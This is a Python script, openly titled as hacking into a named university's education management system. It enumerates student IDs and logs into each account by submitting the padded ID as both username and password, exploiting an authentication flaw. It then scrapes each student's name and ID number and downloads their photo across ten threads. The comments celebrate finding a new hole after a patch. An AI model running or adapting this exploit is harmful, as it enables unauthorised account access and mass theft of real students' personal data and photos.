#! /usr/bin/python
# encoding: utf-8
#
# 0x02_hack_into_core.py
#
# Bad news, last time that guy who ask our Huang for accounts on Education
# Management System can not get any accessable account suddenly. For last week,
# the System has updated, so the default password vulnerability is no longer
# functional. But smart Huang get another vulnerability on the new system. This
# is Huang's leastest version of script hacking into Education Management System
# And this time the script get photos directly.
#
# Set number of threads, and run it, the donwloaded photos will be stored in the
# same directory of current script.

import threading
import httplib2
from bs4 import BeautifulSoup

def setData():
    global password, years, uidRange, uidStartList, classLength, current, lock2, threads

    # The number of threads
    threads = 10

    # The maxium number of people in each classes
    classLength = 40

    # The entering year of each grade
    years = [12, 13, 14, 15]

    # Major_ID: [number_of_classes_in_grade_4, in_grade_3, in_grade_2, in_grade_1]
    uidRange = {
        111: [2, 2, 1, 1],
        112: [0, 0, 1, 1],
        121: [5, 7, 8, 6],
        122: [1, 2, 2, 2],
        131: [3, 4, 3, 2],
        132: [2, 3, 2, 2],
        133: [4, 0, 0, 0],
        211: [5, 5, 6, 6],
        212: [7, 8, 8, 7],
        221: [1, 1, 2, 1],
        222: [2, 2, 1, 1],
        311: [6, 6, 7, 7],
        321: [5, 5, 6, 6],
        331: [2, 3, 2, 2],
        411: [5, 4, 5, 5],
        412: [2, 2, 3, 2],
        421: [5, 5, 5, 4],
        431: [2, 2, 3, 3],
        432: [3, 3, 3, 3],
        511: [6, 8, 7, 7],
        521: [3, 4, 3, 3],
        522: [1, 2, 2, 2],
        611: [3, 5, 4, 3],
        612: [1, 1, 1, 1],
        613: [1, 1, 1, 1],
        621: [1, 1, 1, 1],
        622: [2, 1, 1, 1],
        623: [1, 2, 2, 1],
        624: [1, 1, 1, 1],
        711: [3, 3, 3, 3],
        712: [1, 1, 1, 1],
        721: [1, 0, 0, 0],
        722: [1, 2, 1, 1],
        811: [2, 2, 2, 2],
        821: [2, 2, 2, 1],
        822: [1, 1, 1, 1],
        911: [1, 1, 1, 1],
        912: [1, 1, 1, 1],
        913: [3, 3, 3, 2],
        921: [2, 2, 1, 1],
        922: [3, 2, 3, 3],
        923: [0, 0, 2, 1],
        924: [1, 1, 1, 1],
        925: [1, 1, 1, 1],
        1011: [4, 4, 4, 3],
        1012: [2, 2, 2, 2],
        1013: [1, 1, 1, 1],
        1014: [2, 2, 2, 2],
        1111: [2, 2, 2, 2],
        1112: [2, 2, 1, 1],
        1121: [2, 2, 2, 2],
        1131: [2, 1, 1, 1],
        1132: [2, 2, 2, 2],
        1133: [0, 1, 1, 1],
        1211: [2, 2, 2, 2],
        1221: [2, 2, 2, 2]
    }
    uidStartList = []
    current = -1
    lock2 = threading.Lock()
    for key in uidRange:
        for i in range(0, 4):
            for j in range(1, uidRange[key][i] + 1):
                uidStartList.append(years[i] * 10000000 + key * 1000 + j * 100)

def getNext():
    global current, uidStartList, lock2
    lock2.acquire()
    current += 1
    if current >= len(uidStartList):
        lock2.release()
        return False
    else:
        lock2.release()
        return uidStartList[current]

def getProfile(uid):
    header = {}
    h = httplib2.Http(timeout = 7)
    h.follow_redirects = False
    url = 'http://jwgl.cust.edu.cn/teachweb/Login.aspx?username=' + uid + '%20%20%20&password=' + uid + '%20%20%20&role=student'
    try:
        resp, content = h.request(url, 'GET', headers = header)
        header['Cookie'] = resp['set-cookie'].split(';')[0]
        resp, content = h.request('http://jwgl.cust.edu.cn/teachweb/index1.aspx', 'GET', headers = header)
        #resp, content = h.request('http://jwgl.cust.edu.cn/teachweb/brxx/MySelfInfo.aspx', 'GET', headers = header)
        return content
    except Exception:
        return 'fail'

def getPicture(uid):
    header = {}
    h = httplib2.Http(timeout = 7)
    h.follow_redirects = False
    url = 'http://jwgl.cust.edu.cn/teachweb/Login.aspx?username=' + uid + '%20%20%20&password=' + uid + '%20%20%20&role=student'
    try:
        resp, content = h.request(url, 'GET', headers = header)
        header['Cookie'] = resp['set-cookie'].split(';')[0]
        resp, content = h.request('http://jwgl.cust.edu.cn/teachweb/brxx/MyPicture.aspx', 'GET', headers = header)
        return content
    except Exception:
        return 'fail'

def pull(start, length):
    for i in range(start + 1, start + length + 1):
        uid = '%d' %i
        soup = BeautifulSoup(getProfile(uid))
        try:
            name = soup.find_all('font')[5].string.encode('utf-8')
            noid = soup.find_all('font')[7].string.encode('utf-8')
            f = file(name + '_' + noid + '.jpg', 'w')
            f.write(getPicture(uid))
            f.close()
            print 'UID: ' + uid + ' Get Picture Success'
        except Exception:
            print 'UID: ' + uid + ' Get Picture Failed'

class Cracker(threading.Thread):
    def run(self):
        global classLength
        classStart = getNext()
        while classStart:
            pull(classStart, classLength)
            classStart = getNext()
        return

if __name__ == '__main__':
    setData()
    print 'Cracking Starting ...'
    global threads
    for i in range(0,threads):
        Cracker().start()
